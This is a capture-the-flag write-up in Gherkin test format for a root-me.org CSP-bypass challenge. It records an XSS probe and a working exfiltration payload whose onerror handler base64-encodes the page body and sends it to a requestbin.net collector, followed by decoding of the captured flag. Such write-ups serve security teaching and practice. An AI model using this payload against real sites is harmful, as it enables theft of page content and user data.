## Version 2.0
## language: en

Feature: CSP Bypass - Inline code
  Site:
    root-me.org
  Category:
    Web-Server
  User:
    rocken2k
  Goal:
    Exfiltrate the content of the page

  Background:
  Hacker's software:
    | <Software name> | <Version>     |
    | Kali Linux      | 5.10.         |
    | Firefox Quantum | 68.2.0esr     |

  Machine information:
    Given I am accessing the website through the URL
    """
    http://challenge01.root-me.org:58008/
    """
    Then I see the homepage with links to enter the name [evidence](1.png)

  Scenario: Fail: Follow the initial instruction
    Given the main page
    When I enter my name
    Then It loads a page giving some instructions [evidence](2.png)
    But I can't see the flag
    And I can't solve the challenge

  Scenario: Fail: Try to exploit the vulnerability
    Given the page in php
    When I try to pass the following command as a parameter
    """
    <img src=x onerror=alert('Hello');>
    """
    Then I discover a XXS vulnerability[evidence](3.png)
    But I do not find the flag
    And I can't solve the challenge

  Scenario: Fail: Use the vulnerability to find the flag
    Given that I found a XXS vulnerability
    When read again the statement that said about exfiltration
    Then I realize I need to exploit XXS vulnerability doing an exfiltration
    And I go to the following website
    """
    https://requestbin.net/
    """
    And I create a RequestBin by clicking on the button [evidence](4.png)
    And I use the following command to exploit the vulnerability
    """
    http://challenge01.root-me.org:58008/page?user=<img/src=x onerror="window.
    top.location='//requestbin.net/r/6nbqqeko?htmlflag='.concat(btoa(encodeURI
    Component(document.body.innerHTML)))">
    """
    And on the RequestBin website I receive the get request [evidence](5.png)
    And I realize that is not the flag
    And I can't solve the challenge

  Scenario: Success: Decipher the message
    Given that get request with the html flag
    When I try to decrypt  with a Base64 decode [evidence](6.png)
    Then I realize the decode is URL encoded
    And I decode the URL message [evidence](7.png)
    And I can see the flag
    And I submit the flag
    And I solve the challenge [evidence](8.png)
